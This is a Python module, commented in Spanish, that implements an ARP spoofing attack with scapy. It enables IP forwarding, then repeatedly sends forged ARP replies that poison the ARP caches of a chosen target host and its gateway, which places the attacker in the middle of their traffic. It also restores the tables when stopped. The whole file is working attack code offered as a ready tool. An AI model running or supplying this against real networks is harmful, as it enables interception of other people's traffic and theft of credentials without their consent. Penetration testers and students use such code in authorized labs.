from dataclasses import dataclass
from scapy.layers.l2 import ARP, Ether, getmacbyip as get_mac_address
from scapy.all import sendp
from ..utils.logging_utils import setup_logger
from ..utils.network_utils import enable_ip_forwarding
import time
import threading
from typing import Optional


@dataclass
class ARPSpoofConfig:
    target_ip: str
    gateway_ip: str
    interval: float = 1.0
    verbose: bool = True
    packet_count: Optional[int] = None


class ARPSpoofAttack:
    def __init__(self, config: ARPSpoofConfig):
        self.config = config
        self.logger = setup_logger("arp_spoof")
        self.running = False
        self.packets_sent = 0

    def enable_ip_routing(self):
        """Habilita el IP forwarding."""
        if enable_ip_forwarding():
            self.logger.info("IP Forwarding habilitado")
        else:
            self.logger.error("No se pudo habilitar IP Forwarding")
            return False
        return True

    def craft_arp_packet(self, target_ip: str, spoof_ip: str, target_mac: str):
        """Crea un paquete ARP malicioso encapsulado en una trama Ethernet."""
        arp_packet = ARP(
            op=2,  # ARP Reply
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        return Ether(dst=target_mac) / arp_packet

    def restore_network(self):
        """Restaura las tablas ARP a su estado original."""
        self.logger.info("Restaurando tablas ARP...")

        target_mac = get_mac_address(self.config.target_ip)
        gateway_mac = get_mac_address(self.config.gateway_ip)

        if target_mac and gateway_mac:
            # Restaurar ARP tabla del objetivo
            sendp(Ether(dst=target_mac) / ARP(
                op=2,
                pdst=self.config.target_ip,
                hwdst=target_mac,
                psrc=self.config.gateway_ip,
                hwsrc=gateway_mac
            ), count=5, verbose=False)

            # Restaurar ARP tabla del gateway
            sendp(Ether(dst=gateway_mac) / ARP(
                op=2,
                pdst=self.config.gateway_ip,
                hwdst=gateway_mac,
                psrc=self.config.target_ip,
                hwsrc=target_mac
            ), count=5, verbose=False)

    def spoof_thread(self):
        """Thread principal del ataque."""
        
        target_mac = get_mac_address(self.config.target_ip)
        gateway_mac = get_mac_address(self.config.gateway_ip)

        if not target_mac or not gateway_mac:
            self.logger.error("No se pudo obtener direcciones MAC")
            return

        while self.running:
            # Enviar paquetes ARP maliciosos encapsulados en una trama Ethernet
            sendp(self.craft_arp_packet(
                self.config.target_ip,
                self.config.gateway_ip,
                target_mac
            ), verbose=False)

            sendp(self.craft_arp_packet(
                self.config.gateway_ip,
                self.config.target_ip,
                gateway_mac
            ), verbose=False)

            self.packets_sent += 2

            if self.config.verbose and self.packets_sent % 100 == 0:
                self.logger.info(f"Paquetes ARP enviados: {self.packets_sent}")

            if self.config.packet_count is not None and self.packets_sent >= self.config.packet_count:
                self.logger.info("Número de paquetes alcanzado, deteniendo el ataque.")
                self.running = False
                break

            time.sleep(self.config.interval)

    def start_attack(self):
        """Inicia el ataque ARP Spoofing."""
        if not self.enable_ip_routing():
            return

        self.running = True
        self.logger.info(f"Iniciando ARP Spoofing entre {self.config.target_ip} "
                         f"y {self.config.gateway_ip}")

        try:
            spoof_thread = threading.Thread(target=self.spoof_thread)
            spoof_thread.start()
            spoof_thread.join()
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        """Detiene el ataque y restaura la red."""
        self.running = False
        self.logger.info("Deteniendo ataque ARP Spoof...")
        self.restore_network()
        self.logger.info(
            f"Ataque detenido. Total de paquetes enviados: {self.packets_sent}")
